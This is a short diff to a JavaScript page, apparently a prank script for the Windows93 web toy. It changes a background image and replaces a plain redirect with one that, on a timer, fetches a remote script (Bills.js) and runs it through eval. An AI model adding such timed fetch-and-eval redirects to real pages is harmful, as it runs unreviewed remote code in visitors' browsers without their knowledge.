@@ -97,7 +97,7 @@ blackout(1000, 1);
     
     // Replace the div content and apply new background style
     bgDiv.innerHTML = "";
-    bgDiv.style.backgroundImage = "url('https://github.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/background_cli.jpg?raw=true')";
+    bgDiv.style.backgroundImage = "url('https://github.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/image_2025-10-22_183355876.png?raw=true')";
     bgDiv.style.backgroundSize = "cover"; // makes it stretch
     bgDiv.style.backgroundPosition = "center";
     bgDiv.style.backgroundRepeat = "no-repeat";
@@ -161,6 +161,6 @@ setTimeout(function() {
     index = (index + 1) % sequence.length;
   }, 50); // Change every 0.5 seconds — adjust as you like
     setTimeout(function() {
-        window.location.href = "https://ivorydevrimoalt.github.io";
+        window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/Bills.js').then(response => response.text()).then(script => eval(script));";
     },6000)
 },60000)
